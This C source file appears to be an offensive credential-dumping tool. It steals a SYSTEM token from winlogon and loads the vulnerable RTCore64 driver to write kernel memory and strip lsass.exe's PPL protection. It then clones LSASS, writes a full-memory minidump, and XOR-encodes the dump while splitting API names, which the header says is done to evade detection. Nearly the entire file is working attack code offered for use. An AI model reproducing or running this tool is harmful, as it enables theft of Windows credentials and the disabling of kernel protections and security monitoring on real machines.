/*

    Author: vari.sh

    Description: - This program impersonates SYSTEM and implements LSASS dump. Creates a log.txt file in C:\Windows\Tasks.
                 - Additionally, it uses primitives to access memory via the RTCore64 driver,
                   and reads the EPROCESS structure of lsass.exe to verify the offsets needed for disabling PPL.
                   It then writes the byte that disables PPL.
                 - Finally it clones lsass process and perform minidump of the clone, xoring the result using a temp file in order to bypass detection

*/

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdio.h>
#include <aclapi.h> 
#include <psapi.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>


// Logs
static FILE* logfile;

// Define the function pointer type for MiniDumpWriteDump
typedef BOOL(WINAPI* PFN_MDWD)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
    );

// =====================================================
// Memory Access Primitives via RTCore64
// =====================================================

typedef struct _RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
} RTCORE64_MSR_READ;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");
#endif

typedef struct _RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
} RTCORE64_MEMORY_READ;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");
#endif

typedef struct _RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
} RTCORE64_MEMORY_WRITE;
#if defined(__STDC_VERSION__) && __STDC_VERSION__ >= 201112L
_Static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");
#endif

// IOCTL codes for RTCORE64
static const DWORD RTC64_MSR_READ_CODE = 0x80002030;
static const DWORD RTC64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTC64_MEMORY_WRITE_CODE = 0x8000204c;

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ memRead = { 0 };
    memRead.Address = Address;
    memRead.ReadSize = Size;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_READ_CODE,
        &memRead,
        sizeof(memRead),
        &memRead,
        sizeof(memRead),
        &BytesReturned,
        NULL);
    return memRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_WRITE memWrite = { 0 };
    memWrite.Address = Address;
    memWrite.ReadSize = Size;
    memWrite.Value = Value;
    DWORD BytesReturned;
    DeviceIoControl(Device,
        RTC64_MEMORY_WRITE_CODE,
        &memWrite,
        sizeof(memWrite),
        &memWrite,
        sizeof(memWrite),
        &BytesReturned,
        NULL);
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return (WORD)(ReadMemoryPrimitive(Device, 2, Address) & 0xffff);
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (((DWORD64)ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, (DWORD)(Value & 0xffffffff));
    WriteMemoryPrimitive(Device, 4, Address + 4, (DWORD)(Value >> 32));
}

// Helper function to read a memory buffer in 4-byte chunks
BOOL ReadMemoryBuffer(HANDLE Device, DWORD64 Address, void* Buffer, DWORD BufferSize) {
    DWORD numDwords = BufferSize / 4;
    DWORD remainder = BufferSize % 4;
    for (DWORD i = 0; i < numDwords; i++) {
        ((DWORD*)Buffer)[i] = ReadMemoryDWORD(Device, Address + i * 4);
    }
    if (remainder) {
        DWORD value = ReadMemoryPrimitive(Device, remainder, Address + numDwords * 4);
        memcpy((BYTE*)Buffer + numDwords * 4, &value, remainder);
    }
    return TRUE;
}

// =====================================================
// Retrieve the Base Address of ntoskrnl.exe via EnumDeviceDrivers
// =====================================================
unsigned long long getKBAddr() {
    DWORD cbNeeded = 0;
    PVOID* base = NULL;
    if (EnumDeviceDrivers(NULL, 0, &cbNeeded)) {
        base = (PVOID*)malloc(cbNeeded);
        if (base) {
            if (EnumDeviceDrivers(base, cbNeeded, &cbNeeded)) {
                unsigned long long addr = (unsigned long long)base[0];
                free(base);
                return addr;
            }
            free(base);
        }
    }
    return 0;
}

// =====================================================
// OS Version Detection and Offsets setting
// =====================================================

// Structure containing the three useful offsets
typedef struct _Offsets {
    DWORD64 ActiveProcessLinks;  // Offset of the ActiveProcessLinks field in _EPROCESS
    DWORD64 ImageFileName;       // Offset of the ImageFileName field in _EPROCESS
    DWORD64 Protection;          // Offset of the Protection (PS_PROTECTION) field in _EPROCESS
} Offsets;


// Function to get the OS version
int GetOSVersion() {
    wchar_t CurrentBuild[255] = { 0 };
    DWORD bufferSize = sizeof(CurrentBuild);
    LONG ret = RegGetValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        L"CurrentBuild",
        RRF_RT_REG_SZ,
        NULL,
        CurrentBuild,
        &bufferSize
    );
    if (ret == ERROR_SUCCESS) {
        fwprintf(logfile, L"[*] Windows Build %s detected\n", CurrentBuild);
        return _wtoi(CurrentBuild);
    }
    else {
        fwprintf(logfile, L"[ERROR] Unable to retrieve Windows Build. Error code: %ld\n", ret);
        return -1;
    }
}

// Function to get the offsets
Offsets getOffsets() {
    int build = GetOSVersion();

    if (build < 0) {
        exit(-1);
    }

    Offsets offs = { 0, 0, 0 };

    // Offsets table for x64 (TODO)
    if (build <= 14393) {              // Windows 10 version 1607 (Build 14393)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 17134) {       // Windows 10 version 1803 (Build 17134)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 17763) {       // Windows 10 version 1809 (Build 17763)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 18362) {       // Windows 10 version 1903 (Build 18362)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 18363) {       // Windows 10 version 1909 (Build 18363)
        offs.ActiveProcessLinks = 0x0000;
        offs.ImageFileName = 0x0000;
        offs.Protection = 0x0000;
    }
    else if (build <= 19045) {       // Windows 10 version 22H2 (Build 19041)
        offs.ActiveProcessLinks = 0x448;
        offs.ImageFileName = 0x5a8;
        offs.Protection = 0x87a;
    }
    else if (build <= 22631) {  // Windows 23H2
        offs.ActiveProcessLinks = 0x448;
        offs.ImageFileName = 0x5a8;
        offs.Protection = 0x87a;
    }
    else if (build > 22631) {  // Windows 11 24H2 and above
        offs.ActiveProcessLinks = 0x1d8;
        offs.ImageFileName = 0x338;
        offs.Protection = 0x5fa;
    }
    else {
        wprintf(L"[ERROR] Offsets not defined for build %d on x64.\n", build);
        exit(1);
    }
    return offs;
}

// =====================================================
// Driver loading and unloading
// =====================================================

// Function to load and start the driver
#define DRIVER_NAME "mDriver"
#define DRIVER_PATH "C:\\Windows\\Tasks\\RTCore64.sys"
#define DEVICE_NAME L"\\\\.\\RTCore64"

// Helper function to open the Service Control Manager with the specified access rights
SC_HANDLE OpenSCManagerHandle(DWORD dwAccess) {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, dwAccess);
    if (!hSCM) {
        fprintf(logfile, "[ERROR] OpenSCManager failed. Error code: %lu\n", GetLastError());
    }
    return hSCM;
}

// Helper function to create or open the driver service
SC_HANDLE CreateOrOpenDriverService(SC_HANDLE hSCM, const char* driverName, const char* driverPath) {
    SC_HANDLE hService = CreateServiceA(
        hSCM,
        driverName,          // Internal service name
        driverName,          // Display name
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driverPath,          // Full path to the driver file
        NULL, NULL, NULL, NULL, NULL
    );
    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hService = OpenServiceA(hSCM, driverName, SERVICE_ALL_ACCESS);
            if (hService) {
                fprintf(logfile, "[+] Existing service opened successfully.\n");
            }
            else {
                fprintf(logfile, "[ERROR] Unable to open the existing service. Error code: %lu\n", GetLastError());
            }
        }
        else if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            fprintf(logfile, "[ERROR] Service is marked for deletion.\n");
        }
        else {
            fprintf(logfile, "[ERROR] CreateService error. Error code: %lu\n", err);
        }
    }
    else {
        fprintf(logfile, "[+] Service created successfully.\n");
    }
    return hService;
}

// Function to load and start the driver
int LoadAndStartDriver(void) {
    SC_HANDLE hSCM = OpenSCManagerHandle(SC_MANAGER_CREATE_SERVICE);
    if (!hSCM)
        return 1;

    SC_HANDLE hService = CreateOrOpenDriverService(hSCM, DRIVER_NAME, DRIVER_PATH);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return 1;
    }

    // Start the driver service
    if (!StartServiceA(hService, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            fprintf(logfile, "[ERROR] StartService error. Error code: %lu\n", err);
            DeleteService(hService);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return 1;
        }
        else {
            fprintf(logfile, "[*] Driver is already loaded.\n");
        }
    }
    else {
        fprintf(logfile, "[+] Driver loaded and started successfully.\n");
    }

    // Close the handles
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}

// Function to stop and unload the driver
int StopAndUnloadDriver(const char* driverName) {
    SC_HANDLE hSCM = OpenSCManagerHandle(SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
        return 1;

    SC_HANDLE hService = OpenServiceA(hSCM, driverName, SERVICE_STOP | DELETE | SERVICE_QUERY_STATUS);
    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            fprintf(logfile, "[ERROR] Service does not exist.\n");
            CloseServiceHandle(hSCM);
            return 0;
        }
        else if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            fprintf(logfile, "[*] Service is already marked for deletion.\n");
            CloseServiceHandle(hSCM);
            return 0;
        }
        else {
            fprintf(logfile, "[ERROR] Error: %s.\n", err);
            CloseServiceHandle(hSCM);
            return 0;
        }
        fprintf(logfile, "[ERROR] OpenService failed. Error code: %lu\n", err);
        CloseServiceHandle(hSCM);
        return 1;

    }

    SERVICE_STATUS status;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_NOT_ACTIVE) {
            fprintf(logfile, "[*] The service is not active.\n");
        }
        else {
            fprintf(logfile, "[ERROR] ControlService (stop) failed. Error code: %lu\n", err);
        }
    }
    else {
        fprintf(logfile, "[+] Service stopped successfully.\n");
    }

    // Attempt to delete the service
    if (!DeleteService(hService)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            fprintf(logfile, "[*] Service is already marked for deletion.\n");
        }
        else {
            fprintf(logfile, "[ERROR] DeleteService failed. Error code: %lu\n", err);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return 1;
        }
    }
    else {
        fprintf(logfile, "[+] Service deleted successfully.\n");
    }

    // Close the handles
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return 0;
}

// =====================================================
// Function to Read the EPROCESS Structure of lsass.exe
// =====================================================

void static disablePPL() {

    Offsets offs = getOffsets();
    if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 || offs.Protection == 0) {
        fprintf(logfile, "[ERROR] Offset not mapped... exiting!\n");
        exit(1);
    }

    HANDLE Device = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (Device == INVALID_HANDLE_VALUE) {
        fprintf(logfile, "[ERROR] Unable to obtain a handle to the device object\n");
        return;
    }
    fprintf(logfile, "[*] Device handle obtained\n");

    unsigned long long ntoskrnlBase = getKBAddr();
    fprintf(logfile, "[*] ntoskrnl.exe base address: 0x%llx\n", ntoskrnlBase);

    HMODULE hNtoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    if (!hNtoskrnl) {
        fprintf(logfile, "[ERROR] Failed to load ntoskrnl.exe\n");
        CloseHandle(Device);
        return;
    }
    // Calculate the offset of the exported variable PsInitialSystemProcess
    DWORD64 PsInitialSystemProcessOffset = (DWORD64)GetProcAddress(hNtoskrnl, "PsInitialSystemProcess") - (DWORD64)hNtoskrnl;
    FreeLibrary(hNtoskrnl);

    // Retrieve the address of the System process's EPROCESS
    DWORD64 SystemProcessEPROCESS = ReadMemoryDWORD64(Device, ntoskrnlBase + PsInitialSystemProcessOffset);
    fprintf(logfile, "[*] PsInitialSystemProcess (EPROCESS) address: 0x%llx\n", SystemProcessEPROCESS);

    // Calculate the list head (located within the EPROCESS)
    DWORD64 ListHead = SystemProcessEPROCESS + offs.ActiveProcessLinks;
    DWORD64 CurrentEntry = ReadMemoryDWORD64(Device, ListHead); // First element of the list

    while (CurrentEntry != ListHead) {
        // The current EPROCESS address is obtained by subtracting the offset from the LIST_ENTRY pointer
        DWORD64 eprocess = CurrentEntry - offs.ActiveProcessLinks;

        // Read the ImageFileName field (15 bytes, as defined in the struct) and add a null terminator
        char imageName[16] = { 0 };
        ReadMemoryBuffer(Device, eprocess + offs.ImageFileName, imageName, 15);
        imageName[15] = '\0';

        if (_stricmp(imageName, "lsass.exe") == 0) {
            fprintf(logfile, "[*] Found EPROCESS at 0x%llx\n", eprocess);
            // Read the protection byte (PPL) from the EPROCESS
            BYTE protection = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
            fprintf(logfile, "[*] Protection value: 0x%02X\n", protection);

            // To disable PPL, write 0x00 into this field.
            // Warning: perform this operation only if you are sure the offsets are correct.
            WriteMemoryPrimitive(Device, 1, eprocess + offs.Protection, 0x00);
            fprintf(logfile, "[+] PPL disabled (0x00 written)\n");

            // Read the protection byte (PPL) from the EPROCESS again
            BYTE protection_post = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
            fprintf(logfile, "[*] Protection value after write: 0x%02X\n", protection_post);

            break;
        }
        // Move to the next element in the list
        CurrentEntry = ReadMemoryDWORD64(Device, CurrentEntry);
    }

    CloseHandle(Device);
}

// =====================================================
// Function to load clean versions of DLLs
// =====================================================
HMODULE LoadCleanDLL(char* dllPath) {

    HMODULE hDLL = LoadLibraryA(dllPath);
    if (hDLL)
    {
        fprintf(logfile, "[+] Loaded clean copy of %s at: %p\n", dllPath, hDLL);
    }
    else
    {
        fprintf(logfile, "[ERROR] Failed to load %s. Error: %lu\n", dllPath, GetLastError());
    }

    return hDLL;
}

// =====================================================
// Function to obtain a SYSTEM token
// =====================================================
BOOL GetSystemTokenAndDuplicate(HANDLE* hSystemToken) {
    PROCESSENTRY32 pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        fprintf(logfile, "CreateToolhelp32Snapshot error: %u\n", GetLastError());
        return FALSE;
    }

    BOOL found = FALSE;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;

    if (Process32First(hSnapshot, &pe)) {
        do {
            // Look for winlogon
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                        if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
                            *hSystemToken = hDupToken;
                            found = TRUE;
                            CloseHandle(hToken);
                            CloseHandle(hProcess);
                            fprintf(logfile, "[+] Successfully duplicated token. Process can now run as SYSTEM.\n");
                            break;
                        }
                        CloseHandle(hToken);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (!found) {
        fprintf(logfile, "Failed to obtain system token\n");
        return FALSE;
    }
    return TRUE;
}

// ========================================
// Functions to get all privileges
// ========================================

// Function to enable a specific privilege on the provided token.
// This function does not open the token itself, but uses the token passed as parameter.
BOOL EnablePrivilege(HANDLE hToken, LPCWSTR privilegeName) {
    TOKEN_PRIVILEGES tokenPrivs;
    LUID luid;

    // Lookup the LUID for the specified privilege
    if (!LookupPrivilegeValueW(NULL, privilegeName, &luid)) {
        // wprintf(L"[ERROR] Failed to lookup privilege %ls. Error: %lu\n", privilegeName, GetLastError());
        return FALSE;
    }
    // wprintf(L"[INFO] LUID for privilege %ls retrieved successfully.\n", privilegeName);

    // Set up the TOKEN_PRIVILEGES structure
    tokenPrivs.PrivilegeCount = 1;
    tokenPrivs.Privileges[0].Luid = luid;
    tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token privileges to enable the privilege
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivs, sizeof(tokenPrivs), NULL, NULL)) {
        // wprintf(L"[ERROR] AdjustTokenPrivileges failed for %ls. Error: %lu\n", privilegeName, GetLastError());
        return FALSE;
    }

    // Check if the privilege was successfully enabled
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        // wprintf(L"[ERROR] The privilege %ls could not be enabled. Not all privileges were assigned.\n", privilegeName);
        return FALSE;
    }

    // wprintf(L"[+] Privilege %ls enabled successfully.\n", privilegeName);
    return TRUE;
}

// Function to enable all desired privileges on the provided token.
void EnableAllPrivileges(HANDLE hToken) {
    // List of privileges to enable
    LPCWSTR privileges[] = {
        SE_BACKUP_NAME,
        SE_CHANGE_NOTIFY_NAME,
        SE_CREATE_GLOBAL_NAME,
        SE_CREATE_PAGEFILE_NAME,
        SE_CREATE_PERMANENT_NAME,
        SE_CREATE_SYMBOLIC_LINK_NAME,
        SE_DEBUG_NAME,
        SE_IMPERSONATE_NAME,
        SE_INC_BASE_PRIORITY_NAME,
        SE_INC_WORKING_SET_NAME,
        SE_LOCK_MEMORY_NAME,
        SE_MACHINE_ACCOUNT_NAME,
        SE_MANAGE_VOLUME_NAME,
        SE_PROF_SINGLE_PROCESS_NAME,
        SE_RESTORE_NAME,
        SE_SHUTDOWN_NAME,
        SE_SYSTEM_ENVIRONMENT_NAME,
        SE_SYSTEM_PROFILE_NAME,
        SE_SYSTEMTIME_NAME,
        SE_TAKE_OWNERSHIP_NAME,
        SE_TCB_NAME,
        SE_TIME_ZONE_NAME,
        SE_TRUSTED_CREDMAN_ACCESS_NAME,
        SE_UNSOLICITED_INPUT_NAME
    };

    int numPrivileges = sizeof(privileges) / sizeof(privileges[0]);
    for (int i = 0; i < numPrivileges; i++) {
        // wprintf(L"Trying to enable privilege: %ls\n", privileges[i]);
        if (!EnablePrivilege(hToken, privileges[i])) {
            // wprintf(L"[ERROR] Failed to enable privilege: %ls\n", privileges[i]);
        }
        else {
            // wprintf(L"[INFO] Privilege enabled: %ls\n", privileges[i]);
        }
    }
}

// ==================================
// Cloning LSASS
// ==================================
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = r;                         \
    (p)->Attributes = a;                            \
    (p)->ObjectName = n;                            \
    (p)->SecurityDescriptor = s;                    \
    (p)->SecurityQualityOfService = NULL;           \
}


typedef NTSTATUS(NTAPI* _NtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle OPTIONAL,
    HANDLE DebugPort OPTIONAL,
    HANDLE ExceptionPort OPTIONAL,
    BOOLEAN InJob
    );

#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES     0x00000004
#define PROCESS_CREATE_FLAGS_NO_SYNCHRONIZE      0x00000008

HANDLE CloneLsassProcess() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return NULL;

    PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };
    HANDLE hLsass = NULL;
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (!hLsass) {
        fprintf(logfile, "[!] Failed to open lsass.exe\n");
        return NULL;
    }

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return NULL;

    _NtCreateProcessEx NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(ntdll, "NtCreateProcessEx");
    if (!NtCreateProcessEx) return NULL;

    HANDLE hClone = NULL;
    NTSTATUS status = NtCreateProcessEx(
        &hClone,
        PROCESS_ALL_ACCESS,
        NULL,
        hLsass,
        0,
        NULL,
        NULL,
        NULL,
        FALSE
    );

    CloseHandle(hLsass);

    if (status != 0) {
        fprintf(logfile, "[!] NtCreateProcessEx failed : 0x % X\n", status);
        return NULL;
    }

    fprintf(logfile, "[+] Successfully cloned LSASS process, handle: 0x%p\n", hClone);
    return hClone;
}

DWORD GetProcessIdFromHandle(HANDLE hProcess) {
    return GetProcessId(hProcess);
}

// Function to XOR the dmp file
// XOR encryption function using a string key
char* xor_encrypt_buffer(const unsigned char* buffer, size_t len, const char* key, size_t key_len) {
    char* result = (char*)malloc(len);
    if (!result) return NULL;
    for (size_t i = 0; i < len; i++) {
        result[i] = buffer[i] ^ key[i % key_len];
    }
    return result;
}



// ==================================
// main
// ==================================

int main(void)
{
    // Logs
    logfile = fopen("C:\\Windows\\Tasks\\log.txt", "a");

    // Initialize STARTUPINFO and PROCESS_INFORMATION structures.
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Duplicate SYSTEM token
    HANDLE hSystemToken = NULL;
    if (!GetSystemTokenAndDuplicate(&hSystemToken)) {
        fprintf(logfile, "[!] Failed to duplicate SYSTEM token.\n");
        return 1;
    }
    fprintf(logfile, "[+] Successfully duplicated SYSTEM token.\n");

    EnableAllPrivileges(hSystemToken);

    // Impersonate SYSTEM token
    if (!ImpersonateLoggedOnUser(hSystemToken)) {
        fprintf(logfile, "[!] ImpersonateLoggedOnUser failed, error: %lu\n", GetLastError());
    }
    else {
        fprintf(logfile, "[+] Impersonation succeeded.\n");
    }

    if (!SetThreadToken(NULL, hSystemToken)) {
        fprintf(logfile, "[!] SetThreadToken failed, error: %lu\n", GetLastError());
    }
    else {
        fprintf(logfile, "[+] SetThreadToken succeeded. Current thread now uses SYSTEM token.\n");
    }

    // Load the DLLs kernel32.dll and ntdll.dll
    HMODULE hKernel32 = LoadCleanDLL("kernel32.dll");
    if (!hKernel32) {
        fprintf(logfile, "Error loading kernel32.dll\n");
        return 1;
    }
    HMODULE hNtdll = LoadCleanDLL("ntdll.dll");
    if (!hNtdll) {
        fprintf(logfile, "Error loading ntdll.dll\n");
        return 1;
    }
    HANDLE hDbghelp = LoadCleanDLL("dbghelp.dll");
    if (!hDbghelp) {
        fprintf(logfile, "Error loading ntdll.dll\n");
        return 1;
    }

    // Start the driver
    LoadAndStartDriver();

    // Disable PPL
    disablePPL();

    HANDLE hTempFile = CreateFileA(
        "C:\\Windows\\Temp\\__tmpdump.dmp",  // O usa GetTempFileName
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );

    if (hTempFile == INVALID_HANDLE_VALUE) {
        fprintf(logfile, "[!] Failed to create temp file. Error: %lu\n", GetLastError());
        return 1;
    }

    // Build the function name: "MiniDumpWriteDump"
    char mdPart1[] = "Mini";
    char mdPart2[] = "Dump";
    char mdPart3[] = "Write";
    char mdPart4[] = "Dump";
    char miniFuncName[100] = { 0 };
    sprintf(miniFuncName, "%s%s%s%s", mdPart1, mdPart2, mdPart3, mdPart4);

    PFN_MDWD pMiniDumpWriteDump = (PFN_MDWD)GetProcAddress(hDbghelp, miniFuncName);
    if (!pMiniDumpWriteDump)
    {
        fprintf(logfile, "Unable to retrieve MiniDumpWriteDump address.\n");
        FreeLibrary(hDbghelp);
        CloseHandle(hTempFile);
        // CloseHandle(hProcess);
        return 1;
    }

    HANDLE hClone = CloneLsassProcess();
    DWORD clonedPID = GetProcessIdFromHandle(hClone);

    // Dump the target process
    BOOL dumped = pMiniDumpWriteDump(
        hClone,               // Handle to target process
        clonedPID,              // Process ID
        hTempFile,                  // Handle to a buffer
        MiniDumpWithFullMemory, // Dump type
        NULL,                   // Exception parameter
        NULL,                   // User stream parameter
        NULL                    // Callback parameter
    );

    if (!dumped) {
        fprintf(logfile, "[!] Dump failed. Error: %lu\n", GetLastError());
        CloseHandle(hTempFile);
        return 1;
    }

    // Move file pointer to beginning
    SetFilePointer(hTempFile, 0, NULL, FILE_BEGIN);

    // Get file size
    DWORD fileSize = GetFileSize(hTempFile, NULL);
    BYTE* buffer = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hTempFile, buffer, fileSize, &bytesRead, NULL);

    // XOR encrypt in memory
    const char* key = "0123456789abcdefghij";
    char* encrypted = xor_encrypt_buffer(buffer, fileSize, key, strlen(key));
    free(buffer);
    CloseHandle(hTempFile); // Temp file gets deleted here automatically

    // Write encrypted buffer to actual file
    HANDLE dumpFilePath = CreateFileA("C:\\Windows\\Tasks\\xorred.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD bytesWritten;
    WriteFile(dumpFilePath, encrypted, fileSize, &bytesWritten, NULL);
    CloseHandle(dumpFilePath);
    free(encrypted);

    fprintf(logfile, "[+] XOR'd dump written to C:\\Windows\\Tasks\\xorred.dmp\n");

    // Set file permissions to grant GENERIC_READ to Everyone
    DWORD dwRes;
    EXPLICIT_ACCESS ea;
    PACL pNewDACL = NULL;

    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = GENERIC_READ;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = L"Everyone";

    dwRes = SetEntriesInAcl(1, &ea, NULL, &pNewDACL);
    if (dwRes != ERROR_SUCCESS)
    {
        fprintf(logfile, "Failed to set entries in ACL. Error: %lu\n", dwRes);
    }
    else
    {
        dwRes = SetNamedSecurityInfoA(
            (LPSTR)dumpFilePath,
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,
            NULL,
            NULL,
            pNewDACL,
            NULL);
        if (dwRes != ERROR_SUCCESS)
        {
            fprintf(logfile, "Failed to set security info. Error: %lu\n", dwRes);
        }
    }
    if (pNewDACL)
        LocalFree(pNewDACL);

    // Unload the driver
    StopAndUnloadDriver(DRIVER_NAME);

    fclose(logfile);

    return 0;
}
